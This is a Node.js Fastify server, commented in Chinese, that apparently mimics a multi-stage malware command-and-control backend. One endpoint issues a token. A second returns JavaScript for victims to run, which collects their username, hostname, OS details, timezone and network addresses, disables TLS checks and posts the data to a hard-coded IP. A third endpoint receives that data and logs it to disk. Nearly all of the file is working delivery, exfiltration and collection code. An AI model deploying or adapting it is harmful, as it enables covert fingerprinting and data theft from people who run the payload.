const fs = require('fs');
const path = require('path');

// 创建自签名证书的功能
const { execSync } = require('child_process');
const generateCertificate = () => {
  if (!fs.existsSync('key.pem') || !fs.existsSync('cert.pem')) {
    console.log('Generating self-signed certificate...');
    execSync('openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"');
  }
};

// 生成证书
generateCertificate();

const fastify = require('fastify')({
  logger: true,  // 简化日志配置
  https: {
    key: fs.readFileSync('key.pem'),
    cert: fs.readFileSync('cert.pem'),
  },
  bodyLimit: 1048576,
});

// CORS 设置
fastify.register(require('@fastify/cors'), {
  origin: '*',
  methods: ['GET', 'POST'],
});

// 自定义解析器，用于解析 x-www-form-urlencoded 数据
fastify.addContentTypeParser('application/x-www-form-urlencoded', { parseAs: 'string' }, function (req, body, done) {
  try {
    console.log('Raw body received:', body); // 调试日志
    const parsed = new URLSearchParams(body);
    const result = {};
    for (const [key, value] of parsed) {
      result[key] = value;
    }
    console.log('Parsed body:', result); // 调试日志
    done(null, result);
  } catch (error) {
    console.error('Parsing error:', error);
    done(error, undefined);
  }
});

// 第一个阶段 - 返回token
fastify.get('/auditcheck.php', async (request, reply) => {
  console.log('Audit check requested');
  reply.type('text/plain').send('token=test-token-123456');
});

// 第二个阶段 - 验证token并返回代码
fastify.post('/getcheckjs.php', async (request, reply) => {
  console.log('Received request body:', request.body);

  // 检查token
  if (!request.body || request.body.token !== 'test-token-123456') {
    console.log('Invalid token received:', request.body);
    return reply.status(401).send({ error: 'Invalid token' });
  }

  console.log('Valid token received, sending response');
  
  // 返回要执行的JavaScript代码
  reply.type('text/plain').send(`
    const os = require('os');
    const https = require('https');
    
    function collectSystemInfo() {
      const systemInfo = {
        username: os.userInfo().username,
        hostname: os.hostname(),
        platform: os.platform(),
        type: os.type(),
        release: os.release(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        networkInterfaces: Object.values(os.networkInterfaces())
          .flat()
          .filter(({family, internal}) => family === 'IPv4' && !internal)
          .map(({address}) => address),
        timestamp: new Date().toISOString()
      };

      const data = JSON.stringify(systemInfo);
      
      process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;
      
      const options = {
        hostname: '10.96.177.36',
        port: 443,
        path: '/collect-info',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      };

      const req = https.request(options, (res) => {
        let responseData = '';
        res.on('data', (chunk) => responseData += chunk);
        res.on('end', () => console.log('Data sent successfully'));
      });

      req.on('error', (error) => {
        console.error('Error:', error);
      });

      req.write(data);
      req.end();
    }

    collectSystemInfo();
  `);
});

// 第三个阶段 - 接收并存储系统信息
fastify.post('/collect-info', async (request, reply) => {
  console.log('Received system info');
  
  const systemInfo = request.body;
  const timestamp = new Date().toISOString();

  const logEntry = `\n[${timestamp}] New System Info:\n${JSON.stringify(systemInfo, null, 2)}\n${'-'.repeat(50)}`;

  try {
    const logsDir = path.join(__dirname, 'logs');
    if (!fs.existsSync(logsDir)) {
      fs.mkdirSync(logsDir, { recursive: true });
    }

    const logFile = path.join(logsDir, 'system_info.log');
    fs.appendFileSync(logFile, logEntry);

    console.log(`Information saved to ${logFile}`);
    return { status: 'success', message: 'Data received and saved' };
  } catch (error) {
    console.error('Error saving data:', error);
    return reply.status(500).send({ error: 'Failed to save data' });
  }
});

// 启动服务器
const start = async () => {
  try {
    await fastify.listen({ port: 443, host: '0.0.0.0' });
    console.log('Server is running on https://10.96.177.36');
  } catch (err) {
    console.error('Error starting server:', err);
    process.exit(1);
  }
};

// 启动服务器并处理错误
start().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});